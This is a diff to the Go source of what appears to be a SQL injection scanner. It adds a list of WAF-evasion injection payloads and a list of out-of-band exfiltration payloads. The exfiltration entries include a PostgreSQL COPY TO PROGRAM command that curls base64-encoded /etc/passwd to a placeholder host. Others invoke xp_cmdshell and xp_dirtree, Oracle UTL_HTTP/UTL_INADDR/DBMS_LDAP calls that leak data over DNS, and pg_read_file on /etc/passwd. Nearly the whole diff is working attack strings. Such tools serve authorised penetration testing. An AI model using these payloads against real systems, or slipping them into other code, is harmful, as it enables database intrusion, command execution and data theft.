@@ -93,6 +93,8 @@ func GetAllPayloads() []Payload {
 	all = append(all, mssqlPayloads...)
 	all = append(all, oraclePayloads...)
 	all = append(all, sqlitePayloads...)
+	all = append(all, advancedWAFBypassPayloads...)
+	all = append(all, oastExfilPayloads...)
 	return all
 }
 
@@ -285,4 +287,74 @@ var authBypassPayloads = []Payload{
 	{Value: "')) OR (('1'='1", Technique: TechBlind, DBType: Generic, Description: "Double parenthesis OR"},
 	{Value: "admin')--", Technique: TechBlind, DBType: Generic, Description: "Admin close paren"},
 	{Value: "' UNION SELECT 1,'admin','password'--", Technique: TechUnion, DBType: Generic, Description: "Union inject credentials"},
+}
+
+// advancedWAFBypassPayloads bundles WAF / IDS evasion variants that
+// build on the per-dialect entries above. Sourced from
+// PayloadsAllTheThings's "WAF Bypass" and HackTricks's "SQL Injection
+// Filter Bypass" pages.
+var advancedWAFBypassPayloads = []Payload{
+	// Generic whitespace + comment obfuscation
+	{Value: "'%09OR%091=1--", Technique: TechBlind, DBType: Generic, Description: "Tab as space (WAF whitespace rule)", WAFBypass: true},
+	{Value: "'%0AOR%0A1=1--", Technique: TechBlind, DBType: Generic, Description: "Newline as space", WAFBypass: true},
+	{Value: "'%0DOR%0D1=1--", Technique: TechBlind, DBType: Generic, Description: "Carriage return as space", WAFBypass: true},
+	{Value: "'/*!50000OR*/1=1--", Technique: TechBlind, DBType: MySQL, Description: "Versioned comment OR", WAFBypass: true},
+	{Value: "'/*!50000UnIoN*//*!50000SeLeCt*/1--", Technique: TechUnion, DBType: MySQL, Description: "Versioned comment + case", WAFBypass: true},
+	{Value: "/**//*!12345UNION SELECT*//**/1,2,3", Technique: TechUnion, DBType: MySQL, Description: "Versioned UNION", WAFBypass: true},
+
+	// Logic operator alternatives
+	{Value: "' || '1'='1", Technique: TechBlind, DBType: Generic, Description: "|| as OR (PostgreSQL/Oracle)", WAFBypass: true},
+	{Value: "' && 1=1--", Technique: TechBlind, DBType: Generic, Description: "&& as AND (MySQL bitwise context)", WAFBypass: true},
+	{Value: "' XOR 1--", Technique: TechBlind, DBType: MySQL, Description: "XOR truthy", WAFBypass: true},
+
+	// Function-name obfuscation (where=column-context rewrites)
+	{Value: "' AND (SELECT 1)=1--", Technique: TechBlind, DBType: Generic, Description: "Subquery wrap (escapes AND-OR filter)", WAFBypass: true},
+	{Value: "' AND ascii(substr(database(),1,1))>0--", Technique: TechBlind, DBType: MySQL, Description: "Char-by-char ascii blind", WAFBypass: true},
+	{Value: "' AND (SELECT(LENGTH(database())))>0--", Technique: TechBlind, DBType: MySQL, Description: "Length-of subquery"},
+
+	// Heredoc / quoted-identifier
+	{Value: "' UNION SELECT @@version-- -", Technique: TechUnion, DBType: MySQL, Description: "Comment-then-space terminator (MySQL --)", WAFBypass: true},
+	{Value: "' UNION SELECT NULL--%00", Technique: TechUnion, DBType: Generic, Description: "Null-byte after comment", WAFBypass: true},
+
+	// Encoding tricks
+	{Value: "' OR 1=1 LIMIT 1 OFFSET 0--", Technique: TechBlind, DBType: Generic, Description: "LIMIT OFFSET pad (avoids 'AND 0=0' rule)"},
+	{Value: "' OR 1=1 ORDER BY 1--", Technique: TechBlind, DBType: Generic, Description: "ORDER BY tail", WAFBypass: true},
+	{Value: "' OR 1=1 GROUP BY 1--", Technique: TechBlind, DBType: Generic, Description: "GROUP BY tail", WAFBypass: true},
+	{Value: "' OR EXISTS(SELECT 1)--", Technique: TechBlind, DBType: Generic, Description: "EXISTS(SELECT) tautology", WAFBypass: true},
+	{Value: "'+CONCAT(0x27,0x6f,0x72,0x27)+'1'='1", Technique: TechBlind, DBType: MySQL, Description: "CONCAT(0x...) keyword reconstruction", WAFBypass: true},
+
+	// Quote terminator alternatives
+	{Value: "%00' OR '1'='1", Technique: TechBlind, DBType: Generic, Description: "Null-byte prefix", WAFBypass: true},
+	{Value: "\\' OR '1'='1' /*", Technique: TechBlind, DBType: Generic, Description: "Backslash-escape probe", WAFBypass: true},
+	{Value: "\xc2\xa7 OR 1=1--", Technique: TechBlind, DBType: Generic, Description: "UTF-8 BOM-like prefix (some WAFs strip)", WAFBypass: true},
+
+	// Dialect-specific time-based with hostile chars
+	{Value: "1');WAITFOR DELAY '0:0:5'--", Technique: TechTimeBased, DBType: MSSQL, Description: "MSSQL WAITFOR with stacked", WAFBypass: true},
+	{Value: "1' AND 0=BENCHMARK(20000000,SHA1('a'))--", Technique: TechTimeBased, DBType: MySQL, Description: "Benchmark heavy delay", WAFBypass: true},
+	{Value: "1' AND (SELECT * FROM (SELECT(SLEEP(5)))y)--", Technique: TechTimeBased, DBType: MySQL, Description: "Triple subquery sleep (case-sensitive WAF bypass)", WAFBypass: true},
+	{Value: "1; SELECT pg_sleep(5)--", Technique: TechTimeBased, DBType: PostgreSQL, Description: "Stacked pg_sleep", WAFBypass: true},
+	{Value: "1' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--", Technique: TechTimeBased, DBType: Oracle, Description: "Oracle DBMS_PIPE.RECEIVE_MESSAGE sleep", WAFBypass: true},
+}
+
+// oastExfilPayloads exfiltrate query results out-of-band via DNS or
+// HTTP — useful when the response surface is fully blind. Each carries
+// {OAST_HOST} as a placeholder the detector substitutes with the
+// interactsh / Burp Collaborator host before sending.
+var oastExfilPayloads = []Payload{
+	// MySQL — LOAD_FILE + UDF (no UDF needed for simple DNS via path)
+	{Value: "' AND LOAD_FILE(CONCAT('\\\\\\\\',(SELECT @@version),'.{OAST_HOST}\\\\test.txt'))--", Technique: TechBlind, DBType: MySQL, Description: "MySQL LOAD_FILE UNC DNS exfil"},
+
+	// PostgreSQL — COPY ... PROGRAM or COPY ... FROM (RCE on superuser)
+	{Value: "'; COPY (SELECT version()) TO PROGRAM 'curl http://{OAST_HOST}/?v=$(cat /etc/passwd|base64)'--", Technique: TechStacked, DBType: PostgreSQL, Description: "Postgres COPY TO PROGRAM exfil (requires superuser)"},
+	{Value: "'; SELECT pg_read_file('/etc/passwd')--", Technique: TechStacked, DBType: PostgreSQL, Description: "Postgres pg_read_file (file read)"},
+
+	// MSSQL — xp_dirtree (UNC path triggers SMB → DNS resolves OAST)
+	{Value: "'; EXEC master..xp_dirtree '\\\\{OAST_HOST}\\share'--", Technique: TechStacked, DBType: MSSQL, Description: "MSSQL xp_dirtree DNS exfil"},
+	{Value: "'; EXEC master..xp_cmdshell 'nslookup {OAST_HOST}'--", Technique: TechStacked, DBType: MSSQL, Description: "MSSQL xp_cmdshell nslookup (requires sysadmin)"},
+	{Value: "'; DECLARE @v VARCHAR(8000); SELECT @v=(SELECT @@version); EXEC('master..xp_dirtree ''\\\\'+@v+'.{OAST_HOST}\\\\test'';')--", Technique: TechStacked, DBType: MSSQL, Description: "MSSQL OAST with embedded version"},
+
+	// Oracle — UTL_HTTP / UTL_INADDR / DBMS_LDAP for DNS exfil
+	{Value: "'||(SELECT UTL_HTTP.REQUEST('http://{OAST_HOST}/?v='||(SELECT user FROM dual)) FROM dual)||'", Technique: TechBlind, DBType: Oracle, Description: "Oracle UTL_HTTP exfil"},
+	{Value: "'||(SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual)||'.{OAST_HOST}') FROM dual)||'", Technique: TechBlind, DBType: Oracle, Description: "Oracle UTL_INADDR DNS exfil"},
+	{Value: "'||(SELECT DBMS_LDAP.INIT((SELECT user FROM dual)||'.{OAST_HOST}',80) FROM dual)||'", Technique: TechBlind, DBType: Oracle, Description: "Oracle DBMS_LDAP DNS exfil"},
 }
